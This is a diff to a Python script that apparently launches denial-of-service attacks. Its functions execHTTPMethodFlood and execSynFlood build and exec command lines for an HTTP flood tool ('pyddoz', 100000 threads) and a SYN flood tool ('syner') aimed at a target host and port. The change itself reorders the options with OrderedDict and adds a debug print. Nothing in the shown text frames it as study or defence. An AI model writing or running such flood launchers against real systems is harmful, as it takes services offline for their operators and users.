@@ -8,6 +8,7 @@ import sys
 import netifaces
 import shlex
 import os
+from collections import OrderedDict
 
 servToPort ={
   "acap": 674,
@@ -68,6 +69,7 @@ synerPid = int
 def getCmdArgs(cmdDict):
     cmdArgsStr = ""
     for opt, value in cmdDict.items():
+        print(opt + " " + value)
         cmdArgsStr += str(opt)+ ' ' + str(value)+ ' '
     # cmdArgsStr += "&"
     print("execing : " + cmdArgsStr)
@@ -79,11 +81,27 @@ def execAttackProcess(attackOpts):
     return attackPid
 
 def execHTTPMethodFlood(target):
-    pyddozOpts = {'pyddoz':'','-u' : target,'-th': '100000','-m' : 'g','-r' : 'y', '-b' : 'n', '-ob' : 'n', '-rd' : 'y'}
+    """
+    pyddozOpts = {'pyddoz':'','-u' : target,'-th': '100000','-m' : 'g','-r' : 'y', '-b' : 'n', '-ob' : 'n', '-rd' : 'y'}"""
+    pyddozOpts = OrderedDict()
+    pyddozOpts['pyddoz'] = ''
+    pyddozOpts['-u'] = target
+    pyddozOpts['-th'] = '100000'
+    pyddozOpts['-m'] = 'g'
+    pyddozOpts['-r'] = 'y'
+    pyddozOpts['-b'] = 'n'
+    pyddozOpts['-ob'] = 'n'
+    pyddozOpts['-rd'] = 'y'
     return execAttackProcess(pyddozOpts)
 
 def execSynFlood(URLProto, targetURLWOProto, def_gw_device):
-    synerOpts = {'syner':'','-t': targetURLWOProto,'-p' : servToPort[URLProto], '-i' : def_gw_device}
+    """
+    synerOpts = {'syner':'','-t': targetURLWOProto,'-p' : servToPort[URLProto], '-i' : def_gw_device}"""
+    synerOpts = OrderedDict()
+    synerOpts['syner'] = ''
+    synerOpts['-t'] = targetURLWOProto
+    synerOpts['-p'] = servToPort[URLProto]
+    synerOpts['-i'] = def_gw_device
     return execAttackProcess(synerOpts)
 
 if __name__=="__main__":
